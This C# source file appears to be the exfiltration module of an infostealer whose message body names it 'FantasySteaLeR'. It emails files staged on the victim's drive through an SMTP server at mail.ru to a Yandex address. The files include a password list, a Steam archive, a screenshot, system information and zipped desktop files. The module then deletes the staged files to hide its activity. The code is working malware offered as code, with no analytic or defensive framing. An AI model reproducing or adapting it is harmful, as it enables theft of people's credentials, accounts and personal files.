using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text;

internal class SettingMessage
{
    #region Path
    static string attachfile = @"C:\" + Environment.UserName + ".txt";
   static string ScreenShot = @"C:\ScreenShot.png";
   static string SteaM = @"C:\Steam.zip";
   static string txtFile = @"C:\SysInfo.txt";
   static string Deskt = @"C:\DesktopFiles.zip";
   static string ListS = @"C:\List_Password.txt";
    #endregion
   public static void MessageSend()
    {
       // 587 465 2525 25
        try
        {
            using (MailMessage mess = new MailMessage())
            {
                SmtpClient client = new SmtpClient("smtp.mail.ru", Convert.ToInt32(587))
                {
                    Credentials = new NetworkCredential("email@mail.ru", "password"),
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network
                    
                };
                mess.From = new MailAddress("email@mail.ru");
                mess.To.Add(new MailAddress("комуотправлять@yandex.ru"));
                mess.Subject = Environment.UserName;
                mess.SubjectEncoding = Encoding.UTF8;
                mess.Headers["Content-type"] = "text/plain; charset=UTF-8";
                mess.Body = "FantasySteaLeR";
                #region Add Files
                try
                {
                    mess.Attachments.Add(new Attachment(attachfile));
                    mess.Attachments.Add(new Attachment(ScreenShot));
                    mess.Attachments.Add(new Attachment(SteaM));
                    mess.Attachments.Add(new Attachment(txtFile));
                    mess.Attachments.Add(new Attachment(Deskt));
                    mess.Attachments.Add(new Attachment(ListS));
                }
                catch { }
                #endregion Add Files
                client.Send(mess);
                mess.Dispose();
                client.Dispose();
            }
            #region Delete Files
            try
            {
                File.Delete(attachfile);
                File.Delete(ScreenShot);
                File.Delete(SteaM);
                File.Delete(txtFile);
                File.Delete(Deskt);
                File.Delete(ListS);
            }
            catch { }
            #endregion Delete Files
        }
        catch (Exception exception)
        {
            File.WriteAllText("error.txt", exception.ToString());
        }
    }
}